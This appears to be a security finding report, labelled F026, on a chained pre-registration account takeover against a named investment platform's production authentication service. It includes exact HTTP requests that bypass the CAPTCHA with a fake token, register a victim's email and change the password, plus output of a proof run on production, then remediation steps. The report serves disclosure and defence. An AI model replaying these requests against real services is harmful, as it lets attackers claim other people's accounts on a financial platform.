# F026 - Pre-Registration Account Takeover Chain (F18 + F19 + F24)

## Summary

| Field | Value |
|-------|-------|
| Severity | Critical |
| CVSS 3.1 | 9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| OWASP | A07:2021 - Identification and Authentication Failures |
| Status | Confirmed |

## Description

Three individual findings chain together to create a full unauthenticated account takeover on any email address that has not yet registered on the platform:

1. F18: CAPTCHA validation bypass - any string accepted as captcha_token
2. F19: Active session issued before email verification
3. F24: Password change without current password or re-authentication

An unauthenticated attacker can register an account with ANY email address (even one they don't control), immediately receive a fully active session, and immediately change the password. If the legitimate owner of that email later tries to register, they will find their email is already taken with a password they don't know.

## Attack Flow

### Step 1: Register with target email (no valid CAPTCHA needed)
```
POST /self-service/registration?flow={id} HTTP/2
Host: investor-auth.spiko.io
Content-Type: application/json

{"method":"password","traits":{"email":"victim@example.com","first_name":"A","last_name":"B","preferences":{"locale":"en","investorAppMode":"standard"}},"password":"AttackerPass123!#","transient_payload":{"captcha_token":"bypass"}}
```
Response: HTTP 200, session_token returned immediately. Email verification NOT required.

### Step 2: Change password (no current password needed)
```
POST /self-service/settings?flow={id} HTTP/2
Host: investor-auth.spiko.io
X-Session-Token: {token_from_step1}
Content-Type: application/json

{"method":"password","password":"NewAttackerPassword!#"}
```
Response: HTTP 200, state: success, "Your changes have been saved!"

### Step 3: Verify complete takeover
- Login with attacker's new password: HTTP 200 (success)
- Login with original registration password: HTTP 400 (rejected)
- The email address is now permanently claimed by the attacker

## Proof (Executed on Production)

```
Step 1: Register with target email (CAPTCHA bypassed)
Got session token: ory_st_HGo3b5HSgoyDz...

Step 2: Change password immediately (no email verification, no current password)
State: success
Msg: Your changes have been saved!
HTTP: 200

Step 3: Login with attacker's new password
SUCCESS: Login with attacker password works
HTTP: 200

Step 4: Login with original password (should fail)
Original password REJECTED - password change confirmed
HTTP: 400
```

## Impact

On Spiko, a regulated European investment platform managing tokenized money market funds:

1. An attacker can pre-register any email address before the legitimate owner does
2. The legitimate owner cannot register (email already taken)
3. The attacker can initiate KYC verification, potentially using stolen identity documents
4. If the attacker completes onboarding, they control a financial account tied to the victim's email
5. The entire chain is automated (no CAPTCHA, no email verification, no re-authentication), enabling mass pre-registration attacks

## Remediation

1. Fix CAPTCHA validation (F18): Actually validate tokens against reCAPTCHA v3 API
2. Delay session issuance (F19): Do not issue active sessions until email is verified
3. Require current password (F24): Enforce current password for password changes
4. Rate limit account creation by IP/fingerprint
